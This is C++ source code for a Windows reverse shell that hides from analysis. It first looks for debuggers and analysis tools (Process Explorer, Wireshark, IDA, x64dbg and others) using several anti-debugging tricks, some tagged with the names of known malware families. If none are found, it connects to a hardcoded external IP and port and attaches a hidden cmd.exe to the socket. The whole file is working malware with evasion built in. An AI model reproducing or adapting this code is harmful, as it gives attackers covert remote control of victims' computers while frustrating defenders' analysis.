#define _WINSOCKAPI_    // Prevent inclusion of winsock.h in windows.h
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <cstdint>
#include <ws2tcpip.h>   // Optional: For additional Winsock functions
#include <TlHelp32.h>
#include <strsafe.h>
#pragma comment(lib, "ws2_32.lib")  // Link against the Winsock 2 library
#pragma comment(lib, "Kernel32.lib")


using namespace std;

const wchar_t *SUSPICIOUS_PROCESSES[] = {
    L"PROCEXP.EXE", L"PROCEXP64.EXE", L"TCPVIEW.EXE", L"TCPVIEW64.EXE", L"PROCMON.EXE", L"PROCMON64.EXE",
    L"VMMAP.EXE", L"VMMMAP64.EXE", L"PORTMON.EXE", L"PROCESSLASSO.EXE", L"WIRESHARK.EXE",
    L"FIDDLER.EXE", L"IDA.EXE", L"IDA64.EXE", L"IMMUNITYDEBUGGER.EXE", L"WINDUMP.EXE", L"X64DBG.EXE",
    L"X32DBG.EXE", L"OLLYDBG.EXE", L"PROCESSHACKER.EXE", L"IDAQ.EXE", L"IDAQ64.EXE", L"AUTORUNS.EXE",
    L"DUMPCAP.EXE", L"DE4DOT.EXE", L"HOOKEXPLORER.EXE", L"ILSPY.EXE", L"LORDPE.EXE", L"DNSPY.EXE",
    L"PETOOLS.EXE", L"AUTORUNSC.EXE", L"RESOURCEHACKER.EXE", L"FILEMON.EXE", L"REGMON.EXE", L"WINDBG.EXE"};

// S1039	Bumblebee
bool CheckSuspiciousProcesses()
{
    PROCESSENTRY32W processEntry = {0};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    WCHAR processName[MAX_PATH + 1];

    if (Process32FirstW(hSnapshot, &processEntry))
    {
        do
        {
            StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
            CharUpperW(processName);

            for (const wchar_t *suspiciousProcess : SUSPICIOUS_PROCESSES)
            {
                if (wcsstr(processName, suspiciousProcess))
                {
                    CloseHandle(hSnapshot);
                    return false; 
                }
            }
        } while (Process32NextW(hSnapshot, &processEntry));
    }

    CloseHandle(hSnapshot);
    return true; 
}


DWORD GetParentPID(DWORD pid)
{
    DWORD ppid = 0;
    PROCESSENTRY32W processEntry = {0};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(hSnapshot, &processEntry))
    {
        do
        {
            if (processEntry.th32ProcessID == pid)
            {
                ppid = processEntry.th32ParentProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);
    return ppid;
}


bool CheckParentProcess()
{
    DWORD parentPid = GetParentPID(GetCurrentProcessId());
    WCHAR parentName[MAX_PATH + 1];
    DWORD dwParentName = MAX_PATH;
    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
    if (hParent == NULL)
        return false;

    if (QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName))
    {
        CloseHandle(hParent);
        CharUpperW(parentName);
        if (wcsstr(parentName, L"WINDBG.EXE"))
            return false;
    }
    else
    {
        CloseHandle(hParent);
        return false;
    }

    return true;
}

// S1111: DarkGate
bool checkNotBeingDebugged()
{
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    
    if (pPEB->BeingDebugged)
    {
        printf("Debugger detected\n");
        return false;
    }
    
    printf("No debugger detected\n");
    return true;
}


bool checkNoDebugPort()
{
    typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

    PNtQueryInformationProcess NtQueryInformationProcess = 
        (PNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), 
            "NtQueryInformationProcess"
        );

    if (NtQueryInformationProcess == NULL)
    {
        printf("Failed to get NtQueryInformationProcess\n");
        return false;
    }

    DWORD64 debugPort = 0;
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        ProcessDebugPort,
        &debugPort,
        sizeof(debugPort),
        NULL
    );

    if (NT_SUCCESS(status) && debugPort == 0)
    {
        printf("No debug port detected\n");
        return true;
    }
    
    printf("Debug port detected\n");
    return false;
}


bool checkNtGlobalFlag()
{
    #define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
    #define FLG_HEAP_ENABLE_FREE_CHECK   0x20
    #define FLG_HEAP_VALIDATE_PARAMETERS 0x40
    #define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)

    PDWORD pNtGlobalFlag = (PDWORD)(__readgsqword(0x60) + 0xBC);
    
    if ((*pNtGlobalFlag) & NT_GLOBAL_FLAG_DEBUGGED)
    {
        printf("Debugger flags detected in NtGlobalFlag\n");
        return false;
    }
    
    printf("No debugger flags detected in NtGlobalFlag\n");
    return true;
}


bool checkHeapFlags()
{
    PDWORD pHeapFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x70);
    PDWORD pHeapForceFlags = (PDWORD)((PBYTE)GetProcessHeap() + 0x74);
    
    if ((*pHeapFlags & HEAP_GROWABLE) == 0 || *pHeapForceFlags != 0)
    {
        printf("Suspicious heap flags detected\n");
        return false;
    }
    
    printf("Heap flags appear normal\n");
    return true;
}


bool checkDebugArtifacts()
{
    typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

    PNtQueryInformationProcess NtQueryInformationProcess = 
        (PNtQueryInformationProcess)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), 
            "NtQueryInformationProcess"
        );

    if (NtQueryInformationProcess == NULL)
    {
        printf("Failed to get NtQueryInformationProcess\n");
        return false;
    }

    HANDLE hProcessDebugObject = NULL;
    DWORD processDebugFlags = 0;
    NTSTATUS status;

    status = NtQueryInformationProcess(
        GetCurrentProcess(),
        (PROCESSINFOCLASS)0x1E, 
        &hProcessDebugObject,
        sizeof(HANDLE),
        NULL
    );

    if (NT_SUCCESS(status) && hProcessDebugObject != NULL)
    {
        printf("Debug object handle detected\n");
        return false;
    }

    status = NtQueryInformationProcess(
        GetCurrentProcess(),
        (PROCESSINFOCLASS)0x1F,
        &processDebugFlags,
        sizeof(DWORD),
        NULL
    );

    if (NT_SUCCESS(status) && processDebugFlags == 0)
    {
        printf("Debug flags indicate debugging\n");
        return false;
    }

    printf("No debug artifacts detected\n");
    return true;
}


bool checkDebugRegisters()
{
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(GetCurrentThread(), &context))
    {
        printf("Failed to get thread context\n");
        return false;
    }
    
    if (context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0)
    {
        printf("Debug registers are set\n");
        return false;
    }
    
    printf("No debug registers are set\n");
    return true;
}

volatile BOOL g_isDebugged = TRUE;


LONG WINAPI CustomVectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionPointers) {
    if (pExceptionPointers->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        pExceptionPointers->ContextRecord->Rip++;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


bool checkAdvancedDebugger()
{
    g_isDebugged = TRUE;

    __try {
        DebugBreak();
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        g_isDebugged = FALSE;
    }

    __try {
        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, NULL);
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        g_isDebugged = FALSE;
    }

    PVOID vehHandler = AddVectoredExceptionHandler(1, CustomVectoredExceptionHandler);

    __try {
        RaiseException(EXCEPTION_ILLEGAL_INSTRUCTION, 0, 0, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("ec\n");
    }

    RemoveVectoredExceptionHandler(vehHandler);

    if (g_isDebugged) {
        printf("Debugger detected through advanced exception handling\n");
        return false;
    }

    printf("No debugger detected through advanced exception handling\n");
    return true;
}

bool isSafeEnvironment()
{
    return CheckParentProcess() && CheckSuspiciousProcesses() && 
           checkNotBeingDebugged() && checkNoDebugPort() && checkNtGlobalFlag() &&
           checkHeapFlags() && checkDebugArtifacts() && 
           checkDebugRegisters() &&  checkAdvancedDebugger();
}

int main(int argc, char *argv[])
{
    if (!isSafeEnvironment())
    {
        Sleep(15000);
        return 1;
    }
    string ip = "3.85.20.60";
    short port = 6125;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        return 1;
    }

    SOCKET WSock;
    WSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, (unsigned int)nullptr, (unsigned int)nullptr);

    struct sockaddr_in hax;
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip.c_str());

    if (WSAConnect(WSock, (SOCKADDR *)&hax, sizeof(hax), nullptr, nullptr, nullptr, nullptr) != 0)
    {
        closesocket(WSock);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)WSock;
    sui.wShowWindow = SW_HIDE;

    string process = "cmd.exe";
    if (CreateProcessA(nullptr, (LPSTR)process.c_str(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &sui, &pi))
    {
        HWND hWnd = FindWindowA("ConsoleWindowClass", nullptr);
        if (hWnd != nullptr) {
            PostMessage(hWnd, WM_CLOSE, 0, 0);
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(WSock);
    WSACleanup();

    return 0;
}